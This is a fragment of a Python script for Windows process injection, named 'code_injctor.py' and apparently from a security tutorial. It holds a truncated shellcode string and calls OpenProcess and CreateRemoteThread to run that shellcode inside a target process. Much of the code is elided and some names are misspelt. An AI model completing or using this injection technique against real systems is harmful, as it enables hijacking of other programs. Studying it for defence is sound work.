...
PROESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
...
if not sys.argv[1] or not sys.argv[2]:
    print("Code Injector: ./code_injctor.py <PID to inject> <PID to kill")
    sys.exit(0)
...
shellcode = \
"\xfc\xe8\x44\x00\x00\x8b\x7c\x05\x78\x01\xef\x8b" \
...
h_process = kernel32.OpenProcess(PROESS_ALL_ACCESS, False, int(pid))
...
# 2): if not kernel32.CreateRemoteThread
...
print("[*] Remote thread created with a threead ID of: 0x%08x" % thread_id.value)
